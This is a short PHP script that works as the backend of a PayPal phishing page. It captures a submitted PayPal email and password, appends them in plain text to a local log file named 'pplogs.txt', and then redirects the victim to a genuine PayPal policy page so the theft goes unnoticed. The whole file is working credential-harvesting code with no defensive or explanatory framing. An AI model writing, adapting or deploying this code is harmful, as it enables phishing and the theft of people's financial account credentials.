<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['paypal_email'];
    $password = $_POST['password'];

    $data = "Email: $email, Password: $password" . PHP_EOL;

    // Save to a text file
    file_put_contents('pplogs.txt', $data, FILE_APPEND);

    // Redirect to PayPal security page
    header("Location: https://www.paypal.com/us/legalhub/upcoming-policies-full");
    exit();
}
?>
